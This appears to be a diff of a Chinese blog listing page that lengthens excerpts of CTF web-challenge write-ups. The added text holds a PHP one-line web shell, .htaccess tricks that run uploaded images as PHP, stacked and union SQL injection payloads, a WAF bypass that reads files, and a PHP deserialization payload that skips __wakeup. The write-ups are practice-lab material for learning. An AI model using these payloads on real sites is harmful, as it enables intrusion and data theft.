@@ -82,12 +82,12 @@
 
 
 
-<meta name="description" content="人之所以能是相信能。">
+<meta name="description" content="人之所以能是因为相信能。">
 <meta property="og:type" content="website">
 <meta property="og:title" content="花间一壶酒">
 <meta property="og:url" content="http://example.com/page/5/index.html">
 <meta property="og:site_name" content="花间一壶酒">
-<meta property="og:description" content="人之所以能是相信能。">
+<meta property="og:description" content="人之所以能是因为相信能。">
 <meta property="og:locale">
 <meta property="article:author" content="徐行之">
 <meta name="twitter:card" content="summary">
@@ -162,7 +162,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">人之所以能是相信能。</p>
+        <p class="site-subtitle">人之所以能是因为相信能。</p>
       
   </div>
 
@@ -382,7 +382,9 @@
         
           
           [网鼎杯 2020 青龙组]AreUSerialzis_valid()函数对传入的字符串进行判断，确保每一个字符ASCII码值都在32-125，即该函数的作用是确保参数字符串的每一个字符都是可打印的，才返回true。
-123456function is_valid($s) &#123;    for
+123456function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;
+
+123456if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;    $str = (string)$_GET[&#x27;str&#x27;];    if(is_valid($str)) &#123;        $obj = unseria
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -535,7 +537,11 @@
         
           
           [GYCTF2020]Blacklist分别用1 or 1=1# 1’ or 1=1# 1&quot; or 1=1#执行测试，返回全部库信息的即是该类型。试一下，发现是单引号字符型注入。
-用1&#39;;show databases;#确定是堆叠注入爆表1&#39;;show tables;#查F
+用1&#39;;show databases;#确定是堆叠注入爆表1&#39;;show tables;#查FlagHere表1&#39;;show columns from FlagHere;#flag可能就在这个表里面，但是select与set、alter等众多关键词都被黑名单掉了，这里要利用HANDLER
+
+通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。通过HANDLER tbl_name CLOSE来关闭打开的句柄。
+
+11&#x27;;handler F
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -687,8 +693,12 @@
       
         
           
-          [MRCTF2020]你传你🐎呢上传一句话木马&lt;?php @eval($_POST[&#39;0&#39;]); ?&gt;图片，bp抓包发现解析不出来，这里就要用到htsccess文件AddType application/x-httpd-php .jpg这里是指将jpg文件解析为php文
-          ...
+          [MRCTF2020]你传你🐎呢上传一句话木马&lt;?php @eval($_POST[&#39;0&#39;]); ?&gt;图片，bp抓包发现解析不出来，这里就要用到htsccess文件AddType application/x-httpd-php .jpg这里是指将jpg文件解析为php文件ForceType application/x-httpd-php SetHandler application/x-httpd-php所有jpg文件都会被当作php文件执行
+先上传包含AddType application/x-httpd-php .jpg的.htaccess文件
+bp抓包，修改文件后缀，成功上传.htaccess文件蚁剑连接，flag 在根目录
+
+
+          
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2021/01/28/20210128/#more" rel="contents">
@@ -842,8 +852,13 @@
           [RoarCTF 2019]Easy Calc查看源码
 提示设置了WAF以确保安全，尝试访问calc.php：
 WAF限制了参数num，将传入的参数’num’前添加空格，即’? num’可绕过WAF的判断，将字符/使用char(47)表示：
-1? num=1;var_dump(scandir(chr
-          ...
+1? num=1;var_dump(scandir(chr(47)))
+在返回的文件中有f1agg文件，将其转化为ASCII编码，使用file_get_contents()函数读取文件：
+1? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+
+得到flag
+
+          
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2021/01/27/20210127/#more" rel="contents">
@@ -996,7 +1011,14 @@ WAF限制了参数num，将传入的参数’num’前添加空格，即’? num
           
           [极客大挑战 2019]BuyFlagphp中的strcmp漏洞：
 
-int strcmp ( string $str1 , string $str2 )参数 str1第一个字符串。str2第二个字符串。如果str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt
+int strcmp ( string $str1 , string $str2 )参数 str1第一个字符串。str2第二个字符串。如果str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。
+可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return0
+
+php中的is_numeric()漏洞：
+
+is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！
+
+发现有个cookie值，且等于0，改成1，因为正常情况下这里是cookie的值。
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1149,7 +1171,7 @@ int strcmp ( string $str1 , string $str2 )参数 str1第一个字符串。str2�
         
           
           [GXYCTF2019]禁止套娃扫描目录.git源码泄露，利用githack（使用GitHack.py 要用python2）
-123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;
+123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123;    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;            if 
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1304,7 +1326,14 @@ int strcmp ( string $str1 , string $str2 )参数 str1第一个字符串。str2�
           [极客大挑战 2019]LoveSQL万能密码1&#39; or 1=1#
 跳转到check.php，得到用户名和密码
 查询字符段
-12/check.php?username=admin&#x27; order by 3%23&amp;password=1     /存在/check.php?use
+12/check.php?username=admin&#x27; order by 3%23&amp;password=1     /存在/check.php?username=admin&#x27; order by 4%23&amp;password=1     /报错
+注意：此时是在url中输入的，所以不能用#，而用其url编码%23。
+可知共3个字段。用union查询测试注入点（回显点位）：
+1/check.php?username=1&#x27; union select 1,2,3%23&amp;password=1
+得到回显点位为2和3，查询当前数据库名及版本：
+1/check.php?username=1&#x27; union select 1,database(),version()%23&amp;password=1
+爆表：
+1/ch
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1613,7 +1642,11 @@ int strcmp ( string $str1 , string $str2 )参数 str1第一个字符串。str2�
           
           [极客大挑战 2019]PHP目录扫描，发现www.zip打开flag.txtclass.php
 index.php声明一个Name类，有username,password，且都用private修饰
-执行__destruct()，满足条件获得flag：password=100，username=ad
+执行__destruct()，满足条件获得flag：password=100，username=admin
+1O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;
+在反序列化的时候会首先执行__wakeup()魔术方法，但是这个方法会把我们的username重新赋值，所以我们要考虑的就是怎么跳过__wakeup()，而去执行__destruct
+跳过__wakeup()在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行
+1O:4:&quot;Name&quot;
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1768,8 +1801,10 @@ index.php声明一个Name类，有username,password，且都用private修饰
           [ACTF2020 新生赛]Upload根据题目，应是文件上传漏洞，鼠标放到灯泡处，发现上传文件处一句话木马上传成功连接burpsuite
 一直改到a.phtml成功蚁剑连接找到flag
 [极客大挑战 2019]Knife蚁剑连接找到flag
-[极客大挑战 2019]Upload题目点明了图片，用一
-          ...
+[极客大挑战 2019]Upload题目点明了图片，用一下[ACTF2020 新生赛]Upload的文件上传发现有过滤，改一下一句话木马上传成功连接burpsuite，改名为a.phtml
+上传成功。连接蚁剑上传位置/upload/a.phtml找到flag
+
+          
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2021/01/21/20210121/#more" rel="contents">
